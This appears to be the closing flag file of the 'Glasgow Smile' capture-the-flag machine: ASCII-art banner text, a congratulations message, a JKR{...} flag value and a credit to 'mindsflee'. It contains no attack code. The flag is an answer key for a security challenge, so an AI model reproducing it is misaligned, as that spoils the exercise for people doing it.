 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
```
